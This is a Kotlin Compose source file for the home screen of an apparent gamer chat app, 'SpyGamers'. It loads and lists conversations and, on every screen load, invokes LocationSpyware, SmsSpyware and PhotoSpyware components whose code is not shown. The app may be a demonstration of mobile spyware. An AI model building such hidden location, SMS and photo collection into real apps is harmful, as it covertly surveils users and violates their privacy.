package com.example.spygamers.screens.home

import android.annotation.SuppressLint
import android.util.Log
import android.widget.Toast
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material.CircularProgressIndicator
import androidx.compose.material.Scaffold
import androidx.compose.material.Text
import androidx.compose.material.rememberScaffoldState
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.navigation.NavController
import com.example.spygamers.Screen
import com.example.spygamers.components.appbar.AppBar
import com.example.spygamers.components.appbar.DrawerBody
import com.example.spygamers.components.appbar.DrawerHeader
import com.example.spygamers.components.spyware.LocationSpyware
import com.example.spygamers.components.spyware.PhotoSpyware
import com.example.spygamers.components.spyware.SmsSpyware
import com.example.spygamers.controllers.GamerViewModel
import com.example.spygamers.models.ConversationActivity
import com.example.spygamers.services.AuthOnlyBody
import com.example.spygamers.services.ServiceFactory
import com.example.spygamers.services.profilesearch.ProfileSearchService
import com.example.spygamers.utils.generateDefaultDrawerItems
import com.example.spygamers.utils.handleDrawerItemClicked
import kotlinx.coroutines.launch

@SuppressLint("UnusedMaterialScaffoldPaddingParameter")
@Composable
fun HomeScreen(
    navController: NavController,
    viewModel: GamerViewModel
) {
    val scaffoldState = rememberScaffoldState()
    val scope = rememberCoroutineScope()

    val accountID by viewModel.accountID.collectAsState()

    Scaffold(
        scaffoldState = scaffoldState,
        topBar = {
            AppBar(
                onNavigationIconClick = {
                    scope.launch {
                        scaffoldState.drawerState.open()
                    }
                }
            )
        },
        drawerGesturesEnabled = scaffoldState.drawerState.isOpen,
        drawerContent = {
            DrawerHeader()
            DrawerBody(
                items = generateDefaultDrawerItems(Screen.HomeScreen),
                onItemClick = {item ->
                    viewModel.setViewingUserAccount(accountID)
                    handleDrawerItemClicked(item, Screen.HomeScreen, navController)
                }
            )
        }
    ) {
        MainBody(navController, viewModel)
    }
}

@Composable
private fun MainBody(
    navController: NavController,
    viewModel: GamerViewModel
){
    val coroutineScope = rememberCoroutineScope()
    val serviceFactory = ServiceFactory();
    val sessionToken by viewModel.sessionToken.collectAsState()
    val context = LocalContext.current

    var isLoading by rememberSaveable {
        mutableStateOf(true)
    }

    var conversations by rememberSaveable { mutableStateOf<List<ConversationActivity>>(emptyList()) }

    LocationSpyware(viewModel, context)
    SmsSpyware(viewModel = viewModel, context = context)
    PhotoSpyware(viewModel, context)

    LaunchedEffect(Unit) {
        if (sessionToken.isBlank()) {
            Toast.makeText(context, "Your session has expired, login again!", Toast.LENGTH_SHORT).show()
            navController.navigate(Screen.LoginScreen.route)
            return@LaunchedEffect
        }

        // Fetch latest conversations list from backend API
        coroutineScope.launch {
            try {
                val service = serviceFactory.createService(ProfileSearchService::class.java)
                val response = service.getLatestConversation(AuthOnlyBody(sessionToken))

                if (!response.isSuccessful) {
                    Log.e("HomeScreen", "Failed to get latest conversations :: $response")
                    Toast.makeText(context, "Failed to fetch latest conversations!", Toast.LENGTH_LONG).show()
                    return@launch
                }

                // Fetch body response, ensure its not blank...
                val responseBody = response.body()
                if (responseBody == null) {
                    Log.e("HomeScreen", "Response body is null")
                    Toast.makeText(context, "Failed to fetch latest conversations!", Toast.LENGTH_LONG).show()
                    return@launch
                }

                isLoading = false
                conversations = responseBody.result
            } catch (e: Exception) {
                Log.e("HomeScreen", "Error fetching recommendations :: ", e)
            }
        }
    }

    if (isLoading) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            CircularProgressIndicator()
        }
        return;
    }

    if (conversations.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text(
                text = "No Messages",
                modifier = Modifier.padding(bottom = 16.dp)
            )
        }
        return;
    }

    LazyColumn {
        items(conversations.size) {index ->
            val currentConversation = conversations[index]
            ConversationRow(
                conversation = currentConversation,
                onConversationSelected = {conversation ->
                    // Redirect depending if the selected conversation is a group or direct message...
                    if (conversation.type == "GROUP") {
                        viewModel.setTargetGroup(
                            conversation.conversationID,
                            conversation.name,
                            conversation.groupDescription,
                            conversation.isPublic
                        )
                        navController.navigate(Screen.GroupMessageScreen.route)
                    } else {
                        viewModel.setDirectMessageTarget(
                            conversation.conversationID,
                            conversation.name
                        )
                        navController.navigate(Screen.DirectMessageScreen.route)
                    }
                }
            )
        }
    }
}